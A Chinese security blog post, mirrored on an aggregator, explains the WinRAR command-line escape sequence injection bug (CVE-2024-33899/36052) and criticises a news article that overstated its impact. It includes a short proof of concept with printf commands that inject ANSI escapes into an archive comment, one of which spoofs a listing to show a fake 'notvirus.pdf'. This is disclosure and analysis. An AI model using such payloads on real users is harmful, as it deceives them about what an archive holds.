---
title: CVE-2024-33899 WinRAR RAR/UnRAR Escape Sequence 注入漏洞
url: https://buaq.net/go-241630.html
source: unSafe.sh - 不安全
date: 2024-05-27
fetch_date: 2025-10-06T16:49:07.120919
---

# CVE-2024-33899 WinRAR RAR/UnRAR Escape Sequence 注入漏洞

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/143c97c32aafc42e8b0046057b87f3cd.jpg)

CVE-2024-33899 WinRAR RAR/UnRAR Escape Sequence 注入漏洞

*2024-5-26 21:33:37
Author: [programlife.net(查看原文)](/jump-241630.htm)
阅读量:36
收藏*

---

* [Categories](https://programlife.net/categories/)
* [Archives](https://programlife.net/archives/)
* [Tags](https://programlife.net/tags/)
* [About](https://programlife.net/about/)
* [Sitemap](https://programlife.net/sitemap.xml)

从 CVE-2024-33899 看**垃圾英文小编**污染简体中文互联网🤡

## 0x01. 漏洞简介

WinRAR 里面存在的 [Escape Sequence](https://programlife.net/tags/Escape-Sequence/) 注入漏洞，影响命令行版本的 RAR 和 UnRAR：

* Windows CVE-2024–36052
* Linux/Unix CVE-2024–33899

PoC 测试：

```
cd /tmp
wget https://www.win-rar.com/fileadmin/winrar-versions/rarlinux-x64-624.tar.gz
tar -xzf rarlinux-x64-624.tar.gz
cd rar
./rar a demo.rar readme.txt
printf 'Hello \033[32mTHIS IS GREEN\033[0m\007' | ./rar c demo.rar
./rar l demo.rar
```

![CVE-2024-33899 WinRAR RAR/UnRAR Escape Sequence 注入漏洞](https://programlife.net/uploads/202405/winrar-escape-sequence-injection.webp)

漏洞比较鸡肋，就是玩玩 Escape Sequence Injection，比如伪造压缩文件列表（关键 Payload 为 `\e[8m`）：

```
printf 'Archive: demo.rar\nDetails: RAR 5\n\nAttributes      Size       Date   Time   Name\n----------- ---------  ---------- -----  ---------\n-rw-r--r--          7  2024-05-19 16:26  notvirus.pdf\n----------- ---------  ---------- -----  ---------\n                    7                    1\e[8m' | rar c demo.rar
```

对于某些环境可以 DoS，参考 [Weaponizing Plain Text: ANSI Escape Sequences as a Forensic Nightmare](https://www.blackhat.com/us-23/briefings/schedule/#weaponizing-plain-text-ansi-escape-sequences-as-a-forensic-nightmare-31757)。

## 0x02. 故事起源

在微信公众号看到某条推送：

> **WinRAR 漏洞让攻击者利用 ANSI 转义序列欺骗用户**
>
> 通过制作包含这些序列的恶意档案，攻击者可以操纵显示的输出并欺骗用户相信他们正在打开无害的文件，例如 PDF 或图像。
>
> 当用户尝试在WinRAR中打开看似无害的文件时，由于对文件扩展名处理不当，漏洞就会被触发。
>
> Dushantha 表示，WinRAR 的 ShellExecute 函数没有启动预期的文件，而是收到了错误的参数并执行了隐藏的恶意脚本，例如批处理文件 (.bat) 或命令脚本 (.cmd) 。

看起来把 WinRAR 漏洞 CVE-2023-38831 的影响移植过来了，而且说是漏洞作者 Dushantha 说的🤡，这里是直接翻译了英文内容：

> By crafting malicious archives containing these sequences, attackers can manipulate the displayed output and deceive users into believing they are opening a harmless file, such as a PDF or image.
>
> When a user attempts to open the seemingly benign file from within WinRAR, the vulnerability is triggered due to improper handling of file extensions.
>
> Instead of launching the expected file, WinRAR’s ShellExecute function receives an incorrect parameter and executes a hidden malicious script, such as a batch file (.bat) or command script (.cmd), Dushantha [said](https://sdushantha.medium.com/ansi-escape-injection-vulnerability-in-winrar-a2cbfac4b983).

还给出了作者的原始 Blog，简直一本正经胡说八道。

## 0x03. References

1. [ANSI Escape Injection Vulnerability in WinRAR | by Siddharth Dushantha | May, 2024 | Medium](https://sdushantha.medium.com/ansi-escape-injection-vulnerability-in-winrar-a2cbfac4b983)

文章来源: https://programlife.net/2024/05/26/cve-2024-33899-winrar-escape-sequence-injection-vulnerability/
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)